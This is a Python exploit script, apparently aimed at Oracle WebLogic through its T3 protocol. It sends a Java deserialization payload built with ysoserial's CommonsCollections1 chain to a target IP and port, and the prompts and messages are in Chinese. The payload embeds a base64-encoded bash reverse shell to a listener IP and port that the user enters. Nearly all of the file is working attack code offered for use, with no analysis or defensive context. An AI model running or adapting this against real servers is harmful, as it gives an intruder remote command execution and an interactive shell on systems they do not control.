import binascii
import socket
import optparse
import base64
import os
import time

path = ''


def exp(ip, port, file):
    t3_header = 't3 10.3.6\nAS:255\nHL:19\n\n'
    host = (ip, int(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect(host)
    sock.send(t3_header.encode('utf-8'))
    resp1 = sock.recv(1024)
    data1 = '016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'
    with open(file, 'rb') as f:
        payload = binascii.b2a_hex(f.read()).decode('utf-8')
    data = data1 + payload
    data = '%s%s' % ('{:08x}'.format(len(data) // 2 + 4), data)
    sock.send(binascii.a2b_hex(data))


def usage_method():
    usage = "python %prog -t/--target 1.1.1.1 7001"
    parser = optparse.OptionParser(usage)  ## 写入上面定义的帮助信息
    parser.add_option('-t', '--target', dest='target', type='string', action="store", nargs=2,
                      help='<ip> <port>',
                      default='root')
    options, args = parser.parse_args()
    d_target = options.target
    dip = d_target[0]
    dport = d_target[1]
    ysoserial()
    exp(dip, dport, path)


def ysoserial():
    global path
    listen_ip = input("请输入监听ip地址：")
    listen_port = input("请输入监听端口：")
    shell = "bash -i >& /dev/tcp/" + listen_ip + "/" + listen_port + " 0>&1"
    bs_shell = str(base64.b64encode(shell.encode("utf-8")), "utf-8")
    bs_shell_to_string = encode_shell = "bash -c {echo," + bs_shell + "}|{base64,-d}|{bash,-i}"
    os.system("java -jar ysoserial.jar CommonsCollections1 " + "'" + bs_shell_to_string + "'" + " > poc.ser")
    path = os.getcwd() + '/poc.ser'
    time.sleep(5)


if __name__ == '__main__':
    try:
        usage_method()
        print("执行成功")
    except:
        print("执行失败")
